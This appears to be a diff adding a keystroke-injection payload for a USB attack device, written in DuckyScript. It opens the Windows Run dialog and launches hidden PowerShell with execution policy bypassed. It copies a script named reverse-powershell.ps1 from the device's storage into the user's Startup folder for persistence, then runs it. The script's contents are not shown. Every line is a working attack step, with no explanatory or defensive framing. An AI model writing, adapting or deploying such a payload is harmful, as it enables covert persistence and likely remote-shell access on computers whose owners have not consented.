@@ -1,0 +1,10 @@
+ATTACKMODE HID STORAGE
+DELAY 900
+GUI r
+DELAY 500
+STRING powershell -ExecutionPolicy Bypass -WindowStyle Hidden -NoProfile -Command ^
+"Copy-Item 'D:\reverse-powershell.ps1' -Destination $env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\reverse-powershell.ps1"
+ENTER
+DELAY 500
+STRING powershell -ExecutionPolicy Bypass -WindowStyle Hidden -File $env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\reverse-powershell.ps1
+ENTER
